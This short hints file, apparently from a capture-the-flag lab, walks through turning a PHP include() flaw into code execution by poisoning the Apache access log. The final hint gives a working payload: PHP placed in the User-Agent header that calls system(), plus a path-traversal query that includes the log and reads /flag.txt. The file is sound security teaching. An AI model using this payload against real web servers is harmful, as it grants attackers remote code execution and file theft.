# Hints · 02 log-poison

**Hint 1 (free):** This time the page is `include()`d, not just printed. If you
can point `include` at a file that contains PHP, that PHP runs.

**Hint 2:** Uploads are off and `php://`, `data://`, `expect://` are filtered.
So which file on the server can *you* influence the contents of?

**Hint 3:** Every request you make is written to the Apache access log —
including your `User-Agent`. Put PHP in your User-Agent.

**Hint 4:** Poison, then include the log:
`User-Agent: <?php system('/usr/local/bin/ctf-shell ' . escapeshellarg($_GET['c'] ?? '')); ?>`, then
`?page=../../../../../var/log/apache2/access.log&c=cat /flag.txt`
